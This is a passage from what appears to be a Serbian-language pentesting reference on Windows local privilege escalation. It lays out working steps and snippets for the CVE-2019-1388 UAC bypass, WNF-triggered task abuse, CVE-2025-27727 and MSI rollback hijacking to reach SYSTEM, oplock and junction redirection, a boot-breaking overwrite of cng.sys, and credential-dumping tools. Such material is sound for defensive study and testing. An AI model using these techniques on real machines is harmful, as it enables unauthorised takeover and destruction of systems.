Klikabilni Markdown linkovi prosleđeni funkciji `ShellExecuteExW` mogu da pokrenu opasne URI handler-e (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvrše datoteke pod kontrolom napadača kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Nadgledanje komandnih linija radi pronalaženja lozinki**

Kada dobijete shell kao korisnik, možda postoje zakazani zadaci ili drugi procesi koji se izvršavaju i **prosleđuju akreditive preko komandne linije**. Skripta u nastavku beleži komandne linije procesa na svake dve sekunde i upoređuje trenutno stanje sa prethodnim, ispisujući sve razlike.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Krađa lozinki iz procesa

## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (putem konzole ili RDP-a) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao „NT\AUTHORITY SYSTEM“ iz korisničkog naloga bez privilegija.

To omogućava eskalaciju privilegija i istovremeno zaobilaženje UAC-a pomoću iste ranjivosti. Pored toga, nije potrebno ništa instalirati, a binarnu datoteku koja se koristi tokom postupka potpisao je i izdao Microsoft.

Neki od pogođenih sistema su:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Da biste iskoristili ovu ranjivost, potrebno je izvršiti sledeće korake:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od srednjeg do visokog nivoa integriteta administratora / UAC Bypass

Pročitajte ovo da biste **naučili o nivoima integriteta**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili o UAC-u i načinima zaobilaženja UAC-a:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junction-i direktorijuma za otpremanje u korenu koji se poslužuje

Aplikacija može da napravi predvidljiv poddirektorijum za otpremanje, upiše u njega ime datoteke koje je dostavio pozivalac, a zatim obradi tu datoteku. Ako korisnik sa niskim privilegijama može da ukloni i zameni taj poddirektorijum NTFS junction-om pre upisa na strani servera, upis može da prati junction do direktorijuma koji poslužuje web server. Skripta postavljena tamo može da se pokrene kao identitet web-usluge ako server izvršava taj tip datoteke. Ovo je granica proizvoljnog upisa specifična za aplikaciju; direktorijum za otpremanje sa dozvolom za pisanje ili postojeći junction sami po sebi nisu dokaz za to.

Proverite tačnu konstrukciju putanje i vremenski sled u rukovaocu otpremanjem, efektivne dozvole korisnika za brisanje i kreiranje poddirektorijuma, efektivne ACL-ove odredišta, da li program koji upisuje prati tačke za ponovnu analizu i da li web server izvršava datoteke u tom odredištu. Zasebno potvrdite identitete procesa programa koji upisuje i web servera. Pasivni popis može da prikaže ACL-ove direktorijuma i metapodatke za ponovnu analizu, ali ne može da utvrdi ponašanje rukovaoca ni buduću zamenu junction-a. Ako se izvršavanje odvija pod nalogom usluge, pregledajte **stvarni token procesa** pre razmatranja zasebnog puta preko privilegija tokena.

## Čišćenje privilegovanog zakazanog zadatka pokrenuto WNF-om

Zakazani zadatak koji odbija ručno pokretanje i dalje može da izlaže okidač dostupan neprivilegovanom korisniku. Prilikom provere privilegovanog zadatka, izvezite njegov XML i pregledajte **sve** okidače, kao i DACL zadatka, principal i akciju. Konkretno, `WnfStateChangeTrigger` navodi stanje Windows Notification Facility (WNF); ako to stanje, koje se može zaštititi, dozvoljava trenutnom korisniku da objavi ažuriranje, korisnik može posredno da pokrene zadatak pod konfigurisanim identitetom, uprkos postavci `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na primer, Recall zadatak `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` radio je kao SYSTEM, prihvatao je ažuriranja WNF stanja `7508BCA32C079E41` od standardnog korisnika, a zatim proveravao `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` čak i kada je Recall bio onemogućen.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Da biste testirali dostupnost, razrešite `ZwUpdateWnfStateData` iz `ntdll.dll`, pošaljite prazno ažuriranje za osmobaјtno ime stanja i uporedite status povratne vrednosti sa podacima o poslednjem pokretanju zadatka ili aktivnošću u Procmon-u. Sledeći skraćeni test koristi niz bajtova iz primera Recall zadatka; zamenite ga bajtovima izvezenim za zadatak koji testirate.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Pretvaranje rekurzivnog čišćenja u privilegovano brisanje

Korisni primitv nije samo okidač, već privilegovana rutina čišćenja koja prihvata direktorijum pod kontrolom napadača. Pratite operaciju od enumeracije do konačne izmene: otkrivanje profila/sesija, deca izabrana pomoću džoker-znakova, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` snažni su pokazatelji da će se prethodno proverena putanja kasnije rekurzivno obilaziti. Ako se potomci ne otvaraju relativno u odnosu na pouzdane ručke direktorijuma i ne validiraju pre brisanja, napadač može da promeni razrešavanje putanje između enumeracije i upotrebe.<sup>[[43]](#references)</sup>

Uparite WNF okidač sa [zamenom pomoću oplock-a, junction-a i simboličke veze Object Manager-a](#from-folder-contents-delete-to-system-eop) opisanoj u nastavku: oplock pauzira proces čišćenja nakon što izabere legitimno dete, dok se upisivi predak zamenjuje tako da privilegovano brisanje, nakon nastavka, razrešava putanju kroz `\RPC Control` do zaštićenog cilja. U lancu Recall, ovo je omogućilo SYSTEM brisanje direktorijuma `C:\Config.Msi`, neophodno za dokumentovanu MSI rollback tehniku.<sup>[[31]](#references)[[43]](#references)</sup>

### Ugnježdeni potomci zaobilaze površne popravke reparse tačaka

Validacija samo korena pod kontrolom napadača i njegovog neposrednog deteta ne obezbeđuje rekurzivno brisanje zasnovano na putanji. Ostavite te proverene objekte legitimnim, a zamenu pomoću junction-a/oplock-a premestite u dodatno dete ispod njih; `IFileOperation::DeleteItem` će na kraju doći do nevalidiranog potomka i pratiti njegovo novo odredište. CVE-2026-20941 nastao je upravo zbog ove vrste nepotpune popravke: prva zakrpa za Recall validirala je `UKP` i direktorijum u obliku GUID-a, ali je zadržala staru operaciju rekurzivnog brisanja.<sup>[[43]](#references)</sup>

Bezbedan obrazac je da otvorite **svakog potomka** relativno u odnosu na već pouzdanu ručku direktorijuma, pribavite i proverite konačnu razrešenu putanju/objekat, pa primenite oznaku za brisanje na tu proverenu ručku. Nemojte validirati prefiks, a zatim se vratiti na rekurzivno brisanje zasnovano na putanji. Tokom pregleda zakrpe proverite i strukture na stvarnom mestu poziva: u ovom slučaju, inspekcija tokom izvršavanja strukture `OBJECT_ATTRIBUTES` pri pozivu `NtCreateFile` pokazala je da je `RootDirectory` neprazan i da je ime `{GUID}\\secure_file.lock` relativno, čime je opovrgnut pogrešan izlaz dekompilatora koji je ukazivao na drugu primitivu `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Od proizvoljnog brisanja/premeštanja/preimenovanja fascikle do SYSTEM EoP

Tehnika opisana [**u ovom blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), sa exploit kodom [**dostupnim ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Napad se u suštini sastoji od zloupotrebe Windows Installer rollback funkcije kako bi se legitimne datoteke zamenile zlonamernim tokom procesa deinstalacije. Za to napadač mora da napravi **zlonamerni MSI installer** koji će se koristiti za preuzimanje kontrole nad fasciklom `C:\Config.Msi`. Windows Installer će kasnije koristiti ovu fasciklu za čuvanje rollback datoteka tokom deinstalacije drugih MSI paketa; te rollback datoteke bi bile izmenjene tako da sadrže zlonamerni payload.

### Ubacivanje putanje za čišćenje Windows Installer COM-a (CVE-2025-27727)

Klijent sa niskim privilegijama može da pristupi SYSTEM `msiexec.exe` servisu preko COM objekta `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Obrnutim inženjeringom utvrđeno je da su relevantni pozivi `IMsiServer` `MsiBeginTransactionW` na pomeraju vtable-a `0xA0`, `SetEEUIDirectoryAndFilter` na `0xC8` i `CleanupTempPackages` na `0x50`. Ovi nazivi i pomeraji dobijeni su obrnutim inženjeringom i mogu da se razlikuju među verzijama.<sup>[[41]](#references)</sup>

Za korisnika koji nije administrator, `SetEEUIDirectoryAndFilter` impersonira pozivaoca samo dok otvara navedenu putanju sa zastavicama `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Ovo dokazuje da pozivalac može da obriše direktorijum i sprečava praćenje reparse tačke, ali **ne** vezuje provereni objekat datoteke za kasnije čišćenje niti dokazuje da ga je kreirao Windows Installer.<sup>[[41]](#references)</sup>

Nakon `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` zakazuje putanju kao fasciklu, bez obzira na argument filtera koji je prosledio pozivalac. Servis upisuje imenovanu vrednost `REG_DWORD` u `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ime vrednosti je putanja pod kontrolom pozivaoca, a podaci `0x00000002` označavaju fasciklu. `CleanupTempPackages(NULL, FALSE)` zatim direktno pokreće čišćenje. Njegov proces u kontekstu povišenih privilegija enumeriše vrednosti registra i prosleđuje stavke za fascikle rekurzivnoj funkciji `FDeleteFolder`, bez provere porekla putanje. Ako uobičajeno uklanjanje ne uspe, kod takođe poziva `LockdownPath`, uklanja atribute datoteke i pokušava ponovo.<sup>[[41]](#references)</sup>

Minimalni niz poziva rekonstruisan iz `msi.dll` je:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Korisni primitiv je ponovno korišćenje putanje, a ne preusmeravanje pomoću junction-a. Registrujte napadačevu `C:\Config.Msi`, uklonite je, a zatim pustite Windows Installer da kasnije ponovo kreira istu putanju sa zaštićenim rollback podacima. Čišćenje veruje zastarelom imenu `TempPackages` i briše novi direktorijum kao SYSTEM. Ovo zaobilazi predviđenu zaštitu od `FILE_FLAG_OPEN_REPARSE_POINT` i mitigaciju poverenja u redirekciju, jer nije potreban reparse point.<sup>[[41]](#references)</sup>

Ovaj primitiv za brisanje uklapa se u rollback lanac ispod: sačuvajte zaseban zapis `Installer\Folders`, obrišite zaštićenu `C:\Config.Msi`, ponovo je kreirajte sa NULL DACL-om i zadržite handle sa pravom `WRITE_DAC` otvorenim pre nego što installer učvrsti DACL. Unapred otvoreni handle može da vrati permisivni DACL pomoću `NtSetSecurityObject`, nakon čega se generisani `.rbs` može zameniti pre nastavka rollback-a.<sup>[[41]](#references)</sup>

Microsoft je ispravio putanju tako što je sprečio `CMsiTransaction::SetEEUIDirectoryAndFilter` da poziva `ScheduleFileOrFolderDelete` kada je omogućena nova feature gate opcija. COM poziv i dalje može da vrati uspeh, ali više ne dodaje putanju pod kontrolom napadača u `TempPackages`. Instalirajte Windows bezbednosne ispravke iz aprila 2025. umesto da uspešan povratak metode koristite kao test za proveru ispravke.<sup>[[41]](#references)[[42]](#references)</sup>

Sažeta tehnika je sledeća:

1. **Faza 1 – Priprema za otmicu (`C:\Config.Msi` ostaje prazna)**

- Korak 1: Instalirajte MSI
    - Kreirajte `.msi` koji instalira bezopasnu datoteku (npr. `dummy.txt`) u direktorijum u koji može da se upisuje (`TARGETDIR`).
    - Označite installer kao **„UAC Compliant“**, kako bi ga **korisnik koji nije administrator** mogao pokrenuti.
    - Ostavite **handle** otvoren za datoteku nakon instalacije.

- Korak 2: Započnite deinstalaciju
    - Deinstalirajte isti `.msi`.
    - Proces deinstalacije počinje premeštanjem datoteka u `C:\Config.Msi` i njihovim preimenovanjem u `.rbf` datoteke (rollback rezervne kopije).
    - **Anketirajte otvoreni handle** pomoću `GetFinalPathNameByHandle` da biste utvrdili kada datoteka postane `C:\Config.Msi\<random>.rbf`.

- Korak 3: Prilagođena sinhronizacija
    - `.msi` sadrži **prilagođenu akciju deinstalacije (`SyncOnRbfWritten`)** koja:
        - Signalizira kada je `.rbf` upisan.
        - Zatim **čeka** drugi događaj pre nego što nastavi deinstalaciju.

- Korak 4: Sprečite brisanje datoteke `.rbf`
    - Kada stigne signal, **otvorite datoteku `.rbf`** bez `FILE_SHARE_DELETE` — time se **sprečava njeno brisanje**.
    - Zatim **pošaljite signal nazad** kako bi deinstalacija mogla da se završi.
    - Windows Installer ne uspeva da obriše `.rbf`, a pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.

- Korak 5: Ručno obrišite `.rbf`
    - Vi, napadač, ručno brišete datoteku `.rbf`.
    - Sada je **`C:\Config.Msi` prazna**, spremna za otmicu.

> U ovom trenutku **aktivirajte ranjivost za brisanje proizvoljnog direktorijuma na nivou SYSTEM-a** da biste obrisali `C:\Config.Msi`.

2. **Faza 2 – Zamena rollback skripti zlonamernim skriptama**

- Korak 6: Ponovo kreirajte `C:\Config.Msi` sa slabim ACL-ovima
    - Sami ponovo kreirajte direktorijum `C:\Config.Msi`.
    - Postavite **slabe DACL-ove** (npr. Everyone:F) i **ostavite handle otvoren** sa pravom `WRITE_DAC`.

- Korak 7: Pokrenite drugu instalaciju
    - Ponovo instalirajte `.msi`, uz:
        - `TARGETDIR`: lokacija u koju može da se upisuje.
        - `ERROROUT`: promenljiva koja izaziva prinudni neuspeh.
    - Ova instalacija će se koristiti za ponovno pokretanje **rollback-a**, koji čita `.rbs` i `.rbf`.

- Korak 8: Pratite pojavu `.rbs`
    - Koristite `ReadDirectoryChangesW` da pratite `C:\Config.Msi` dok se ne pojavi novi `.rbs`.
    - Zabeležite njegovo ime datoteke.

- Korak 9: Sinhronizujte pre rollback-a
    - `.msi` sadrži **prilagođenu akciju instalacije (`SyncBeforeRollback`)** koja:
        - Signalizira događaj kada se kreira `.rbs`.
        - Zatim **čeka** pre nego što nastavi.

- Korak 10: Ponovo primenite slabe ACL-ove
    - Nakon prijema događaja `.rbs created`:
        - Windows Installer **ponovo primenjuje jake ACL-ove** na `C:\Config.Msi`.
        - Ali, pošto i dalje imate handle sa pravom `WRITE_DAC`, možete **ponovo primeniti slabe ACL-ove**.

> ACL-ovi se **proveravaju samo prilikom otvaranja handle-a**, tako da i dalje možete da upisujete u direktorijum.

- Korak 11: Ubacite lažne `.rbs` i `.rbf` datoteke
    - Prepišite datoteku `.rbs` **lažnom rollback skriptom** koja govori Windows-u da:
        - Vrati vašu datoteku `.rbf` (zlonamerni DLL) na **privilegovanu lokaciju** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Ubacite lažnu datoteku `.rbf` koja sadrži **zlonamerni DLL payload na nivou SYSTEM-a**.

- Korak 12: Pokrenite rollback
    - Pošaljite signal sinhronizacionom događaju da bi installer nastavio.
    - **Prilagođena akcija tipa 19 (`ErrorOut`)** podešena je tako da **namerno izazove neuspeh instalacije** u poznatoj tački.
    - Time se pokreće **rollback**.

- Korak 13: SYSTEM instalira vaš DLL
    - Windows Installer:
        - Čita vaš zlonamerni `.rbs`.
        - Kopira vaš `.rbf` DLL na ciljnu lokaciju.
    - Sada imate **zlonamerni DLL na putanji koju učitava SYSTEM**.

- Završni korak: Izvršite SYSTEM kod
    - Pokrenite pouzdanu **automatski povišenu binarnu datoteku** (npr. `osk.exe`) koja učitava DLL čiju ste putanju preoteli.
    - **Gotovo**: vaš kod se izvršava **kao SYSTEM**.


### Od proizvoljnog brisanja/premeštanja/preimenovanja datoteka do SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možete da obrišete **ceo direktorijum** (npr. `C:\Config.Msi`). Ali šta ako vaša ranjivost omogućava samo **brisanje proizvoljnih datoteka**?

Možete da iskoristite **NTFS interne mehanizme**: svaki direktorijum ima skriveni alternativni tok podataka koji se zove:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ovaj stream čuva **metapodatke indeksa** fascikle.

Dakle, ako **obrišete stream `::$INDEX_ALLOCATION`** fascikle, NTFS **uklanja celu fasciklu** iz sistema datoteka.

To možete da uradite pomoću standardnih API-ja za brisanje datoteka, kao što je:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Iako pozivate API za brisanje *datoteke*, on **briše samu fasciklu**.

### Od brisanja sadržaja fascikle do SYSTEM EoP
Šta ako vam primitiv ne dozvoljava brisanje proizvoljnih datoteka/fascikli, ali **dozvoljava brisanje *sadržaja* fascikle koju kontroliše napadač**?

1. Korak 1: Napravite fasciklu-mamac i datoteku
- Napravite: `C:\temp\folder1`
- Unutar nje: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- Oplock **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Korak 3: Pokrenite SYSTEM proces (npr., `SilentCleanup`)
- Ovaj proces skenira fascikle (npr., `%TEMP%`) i pokušava da obriše njihov sadržaj.
- Kada dođe do `file1.txt`, **oplock se aktivira** i prepušta kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
    - Time se prazni `folder1` bez prekidanja oplock-a.
    - Nemojte direktno brisati `file1.txt` — time bi se oplock prerano oslobodio.

- Opcija B: Pretvorite `folder1` u **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcija C: Napravite **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ovo cilja interni NTFS tok u kom se čuvaju metapodaci fascikle — brisanjem njega briše se fascikla.

5. Korak 5: Otpusti oplock
- SYSTEM proces nastavlja i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction + symlink, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Rezultat**: `C:\Config.Msi` je obrisan od strane SYSTEM naloga.

### Od kreiranja proizvoljne fascikle do trajnog DoS-a

Iskoristite primitiv koji vam omogućava da **kreirate proizvoljnu fasciklu kao SYSTEM/admin** — čak i ako **ne možete da upisujete datoteke** ili **postavite slabe dozvole**.

Kreirajte **fasciklu** (ne datoteku) sa imenom **kritičnog Windows drajvera**, npr.:
```
C:\Windows\System32\cng.sys
```

- Ova putanja obično odgovara kernel-mode upravljačkom programu `cng.sys`.
- Ako je **unapred kreirate kao fasciklu**, Windows neće uspeti da učita stvarni upravljački program pri pokretanju sistema.
- Zatim Windows pokušava da učita `cng.sys` tokom pokretanja sistema.
- Nailazi na fasciklu, **ne uspeva da pronađe stvarni upravljački program** i **ruši se ili zaustavlja pokretanje sistema**.
- **Nema rezervne opcije** ni **oporavka** bez spoljne intervencije (npr. popravke pokretanja sistema ili pristupa disku).

### Od privilegovanih putanja za logove/rezervne kopije i OM symlinkova do proizvoljnog prepisivanja datoteka / DoS-a pri pokretanju sistema

Kada **privilegovana usluga** upisuje logove/izvoze na putanju pročitanu iz **konfiguracije u koju može da se upisuje**, preusmerite tu putanju pomoću **Object Manager symlinkova + NTFS mount points** da biste privilegovani upis pretvorili u proizvoljno prepisivanje datoteka (čak i **bez SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Zahtevi**
- Konfiguracija koja čuva ciljnu putanju može da se menja napadačevim upisom (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Privilegovana operacija koja upisuje na tu putanju (log, izvoz, izveštaj).

**Primer lanca**
1. Pročitajte konfiguraciju da biste saznali odredišnu putanju privilegovanog loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez administratorskih privilegija:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. administrator pokrene „send test SMS“). Upis se sada obavlja u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisano odredište (hex/PE parser) da biste potvrdili oštećenje; ponovno pokretanje primorava Windows da učita izmenjenu putanju drajvera → **DoS petljom pri pokretanju**. Ovo se može primeniti i na bilo koju zaštićenu datoteku koju će privilegovana usluga otvoriti radi pisanja.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako postoji kopija u `C:\Windows\System32\cng.sys`, prvo može pokušati da je učita, zbog čega je to pouzdano odredište za DoS pomoću oštećenih podataka.



## **Od High Integrity do System**

### **Novi servis**

Ako već radite u procesu sa nivoom High Integrity, **put do SYSTEM** može biti jednostavan: samo **kreirajte i pokrenite novi servis**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Prilikom kreiranja service binary-ja, proverite da li je validan service ili da li binary dovoljno brzo izvršava neophodne radnje, jer će biti prekinut za 20 sekundi ako nije validan service.

### AlwaysInstallElevated

Iz procesa visokog integriteta možete pokušati da **omogućite AlwaysInstallElevated registry entries** i **instalirate** reverse shell pomoću _**.msi**_ wrapper-a.\
[Više informacija o uključenim registry ključevima i tome kako instalirati _.msi_ paket možete pronaći ovde.](#alwaysinstallelevated)

### Visok integritet + SeImpersonate privilegija do System-a

**Kod možete** [**pronaći ovde**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do privilegija Full Token

Ako imate te token privilegije (verovatno ćete ih pronaći u već pokrenutom procesu visokog integriteta), moći ćete da **otvorite skoro svaki proces** (osim zaštićenih procesa) pomoću SeDebug privilegije, **kopirate token** procesa i kreirate **proizvoljan proces sa tim tokenom**.\
Ova tehnika obično podrazumeva **izbor bilo kog procesa koji se izvršava kao SYSTEM sa svim token privilegijama** (_da, možete pronaći SYSTEM procese koji nemaju sve token privilegije_).\
**Primer koda koji izvršava predloženu tehniku možete** [**pronaći ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju privilegija u `getsystem`. Tehnika se sastoji od **kreiranja pipe-a, a zatim kreiranja/zloupotrebe service-a za pisanje u taj pipe**. Zatim će **server** koji je kreirao pipe pomoću privilegije **`SeImpersonate`** moći da **impersonate-uje token** pipe klijenta (service-a) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o named pipe-ovima, pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**prelaska sa visokog integriteta na System pomoću named pipe-ova, pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **otmete dll** koji **učitava** **proces** pokrenut kao **SYSTEM**, moći ćete da izvršite proizvoljan kod sa tim dozvolama. Zato je Dll Hijacking koristan i za ovu vrstu eskalacije privilegija, a uz to ga je **mnogo lakše izvesti iz procesa visokog integriteta**, jer taj proces ima **write dozvole** nad folderima koji se koriste za učitavanje dll-ova.\
**Više o Dll hijacking-u možete** [**saznati ovde**](dll-hijacking/index.html)**.**

### **Od Administrator ili Network Service do System-a**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE ili NETWORK SERVICE do punih privilegija

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Dodatna pomoć

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Korisni alati

**Najbolji alat za traženje vektora lokalne eskalacije privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava pogrešne konfiguracije i osetljive datoteke (**[**pogledajte ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detektovan.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava moguće pogrešne konfiguracije i prikuplja informacije (**[**pogledajte ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači sačuvane informacije o sesijama u PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači kredencijale iz Credential Manager-a. Detektovan.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Isprobava prikupljene lozinke na nalozima u domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS spoofing i man-in-the-middle alat.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna Windows enumeracija za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate privesc ranjivosti (ZASTAREO, zamenjen alatom Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(Potrebna su Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate privesc ranjivosti (mora da se kompajlira pomoću VisualStudio) ([**prekompajlirana verzija**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Ispituje host u potrazi za pogrešnim konfiguracijama (više alat za prikupljanje informacija nego za privesc) (mora da se kompajlira) **(**[**prekompajlirana verzija**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači kredencijale iz velikog broja softvera (prekompajlirani exe na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port alata PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava pogrešne konfiguracije (prekompajlirani executable na github-u). Ne preporučuje se. Ne radi dobro u Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe iz python-a). Ne preporučuje se. Ne radi dobro u Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ovog posta (za ispravan rad mu nije potreban accesschk, ali može da ga koristi).

**Local**

